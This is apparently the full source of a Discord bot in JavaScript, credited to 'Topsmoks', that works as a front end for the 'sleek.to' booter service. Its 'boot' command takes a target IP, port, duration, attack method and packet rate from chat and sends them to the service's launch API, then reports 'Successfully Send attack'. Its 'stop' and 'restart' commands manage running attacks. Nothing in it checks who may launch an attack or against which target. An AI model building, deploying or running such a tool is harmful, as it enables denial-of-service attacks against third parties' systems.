const Discord = require('discord.js');
const { prefix, token , sleektotoken } = require('./config.json');
var rp = require('request-promise');

const client = new Discord.Client();

client.once('ready', () => {
	console.log(`Ready!`);
});

client.on('message', message => {
	if (!message.content.startsWith(prefix) || message.author.bot) return;

	const args = message.content.slice(prefix.length).trim().split(/ +/);
    const cmd = args.shift().toLowerCase();
    
    if(cmd == "boot"){

        if(!args[0]){
            var embed = new Discord.MessageEmbed()
            .addField(":x: Error" , "IP Wasn't filled.")
            message.channel.send(embed);
            return;
        }
        else if (!args[1]){
            var embed = new Discord.MessageEmbed()
            .addField(":x: Error" , "PORT Wasn't filled.")
            message.channel.send(embed);
            return;
        }
        else if (!args[2]){
            var embed = new Discord.MessageEmbed()
            .addField(":x: Error" , "DURATION Wasn't filled.")
            message.channel.send(embed);
            return;
        }
        else if (!args[3]){
            var embed = new Discord.MessageEmbed()
            .addField(":x: Error" , "METHOD Wasn't filled. All method can be found [here](https://pastebin.com/raw/90pWNhAt)")
            message.channel.send(embed);
            return;
        }
        else if (!args[4]){
            var embed = new Discord.MessageEmbed()
            .addField(":x: Error" , "PACKETS PER SECOND Wasn't filled.")
            message.channel.send(embed);
            return;
        }

        rp({
            method: 'POST',
            uri: 'https://api.sleek.to/tests/launch',
            body: {
                token: sleektotoken,
                target: args[0],
                port: args[1],
                duration: args[2],
                method: args[3],
                pps: args[4]
            },
            json: true
        }).then(function (data) {
            var embed = new Discord.MessageEmbed()
            .setTitle(":white_check_mark: Successfully Send attack")
            .addField("IP:" , args[0])
            .addField("PORT:" , args[1])
            .addField("DURATION:" , args[2])
            .addField("METHOD:" , args[3])
            .addField("PPS:" , args[4])
            .addField("BOOT ID:" , data.test_id)
            .setTimestamp()
            .setFooter(message.guild.name + " | Sleek.to Bot by Topsmoks")
                message.channel.send(embed)
            })
            .catch(function (err) {
                console.log(err);
                message.channel.send("Error occurred, Sent to console.")
            });
    }
    else if (cmd == "stop"){
        if(!args[0]){
            var embed = new Discord.MessageEmbed()
            .addField(":x: Error" , "BOOT ID Wasn't filled.")
            message.channel.send(embed);
            return;
        }


        rp({
            method: 'POST',
            uri: 'https://api.sleek.to/tests/stop',
            body: {
                token: sleektotoken,
                test_id: args[0],
            },
            json: true
        }).then(function (data) {
            var embed = new Discord.MessageEmbed()
            .setTitle(":white_check_mark: Successfully stopped boot")
            .addField("ID:" , args[0])
            message.channel.send(embed);
            })
            .catch(function (err) {
                console.log(err);
                message.channel.send("Error occurred, Sent to console.")
            });

    }
    else if (cmd == "restart"){
        if(!args[0]){
            var embed = new Discord.MessageEmbed()
            .addField(":x: Error" , "BOOT ID Wasn't filled.")
            message.channel.send(embed);
            return;
        }


        rp({
            method: 'POST',
            uri: 'https://api.sleek.to/tests/restart',
            body: {
                token: sleektotoken,
                test_id: args[0],
            },
            json: true
        }).then(function (data) {
            var embed = new Discord.MessageEmbed()
            .setTitle(":white_check_mark: Successfully restarted boot")
            .addField("ID:" , args[0])
            message.channel.send(embed);
            })
            .catch(function (err) {
                console.log(err);
                message.channel.send("Error occurred, Sent to console.")
            });
    }
});

client.login(token);






















    